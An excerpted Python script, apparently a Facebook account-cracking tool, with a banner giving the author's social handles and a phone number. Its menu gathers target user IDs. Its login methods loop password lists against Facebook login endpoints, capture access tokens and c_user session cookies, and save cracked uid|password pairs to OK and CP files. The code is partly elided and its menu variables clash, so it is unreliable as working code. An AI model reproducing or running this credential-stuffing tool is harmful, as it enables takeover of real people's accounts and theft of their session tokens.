...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 RAAZ VAAU 🔥].  ║
 
\x1b[0;33m║       #TOOL AUTHOR [ RAZ VAAU] BD CYBER ZONE . ║
...
\x1b[0;33m║#YOUTUBE : RAZ TRICKS😐.  ║
 
\x1b[0;33m║#FACEBOOK : NAME [PRANTO AHMED   II ].       ║
 
\x1b[0;33m║#GITHUB : https://github.com/DEVILRAZ.   ║
 
\x1b[0;33m║#WHATSAPP : +8801408479204.                   ║
...
def menu():
	...
	elif Subhan == "1" or R4A33Z == "01":
 
		publik()
 
		method()
 
	elif Subhan == "2" or R4A33Z == "02":
 
		follower()
 
		method()
 
	elif R4A33Z == "3" or  R4A33Z == "03":
 
		massal()
 
		method()
 
	elif Umair == "4" or R4A33Z == "04":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mR4A33Z PRO/FASTER \033[1;97m]")
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[R4A33Z-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[R4A33Z-CP] %s|%s\033[0;92m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[R4A33Z-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[R4A33Z-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				open("OK/%s.txt"%(tR4A33Z),"a").write(" + %s|%s\n"%(uid, pw))
				...
				print("\r\033[0;95m[R4A33Z-CP] %s|%s\033[0;91m        "%(uid, pw))
		...
		try:
			...
			for pw in asu:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					...
					open("CP/%s.txt"%(tR4A33Z),"a").write(" + %s|%s\n"%(uid, pw))
